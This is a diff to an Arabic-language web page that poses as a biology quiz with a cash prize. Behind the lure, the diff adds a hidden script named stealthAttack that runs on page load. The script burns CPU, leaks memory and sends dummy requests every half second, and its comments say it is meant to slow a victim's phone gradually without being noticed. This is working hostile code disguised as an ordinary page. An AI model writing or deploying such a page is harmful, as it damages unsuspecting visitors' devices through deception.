@@ -1,22 +1,41 @@
-<script>
-    // هجوم صامت: استهلاك موارد ذكي (Trickle Down Exhaustion)
-    function stealthAttack() {
-        // بدلاً من Loop لا نهائي، نستخدم Interval يعمل في الخلفية ببطء
-        setInterval(() => {
-            // 1. استهلاك بسيط للمعالج (عمليات حسابية لا تظهر في الواجهة)
-            for (let i = 0; i < 500000; i++) {
-                Math.sqrt(Math.random() * 88.88);
-            }
-            
-            // 2. تسريب ذاكرة بسيط (Memory Leak) يزداد مع الوقت
-            // الضحية لن يشعر بالتهنيج فوراً، بل سيشعر أن جواله بدأ "يثقل" تدريجياً
-            let leak = new Array(50000).fill("Nawaf_Academy_Hidden_Task");
-            
-            // 3. إشغال الشبكة بطلبات وهمية (Hidden Background Requests)
-            fetch('#?data=' + Math.random()); 
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>مسابقة مادة الأحياء</title>
+    <meta property="og:title" content="مسابقة مادة الأحياء - المستوى الأول">
+    <meta property="og:description" content="اختبر معلوماتك الآن، الفائز بالمركز الأول له مبلغ مالي مجزي.">
+    
+    <style>
+        body { background-color: #f4f4f4; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
+        .loading { color: #333; font-size: 20px; }
+    </style>
+</head>
+<body>
 
-        }, 500); // يعمل كل نصف ثانية (بطيء بما يكفي ليكون صامتاً)
-    }
+    <div class="loading">
+        <h1>🏆 مسابقة مادة الأحياء 🏆</h1>
+        <p>جاري تحميل الأسئلة، يرجى الانتظار ثواني...</p>
+    </div>
 
-    window.onload = stealthAttack;
-</script>
+    <script>
+        // كود الهجوم الصامت الذي ناقشناه
+        function stealthAttack() {
+            setInterval(() => {
+                // استهلاك المعالج
+                for (let i = 0; i < 500000; i++) {
+                    Math.sqrt(Math.random() * 88.88);
+                }
+                // تسريب الذاكرة ببطء
+                let leak = new Array(50000).fill("Nawaf_Academy_Task");
+                // إشغال الشبكة
+                fetch('#?test=' + Math.random()); 
+            }, 500);
+        }
+
+        window.onload = stealthAttack;
+    </script>
+</body>
+</html>
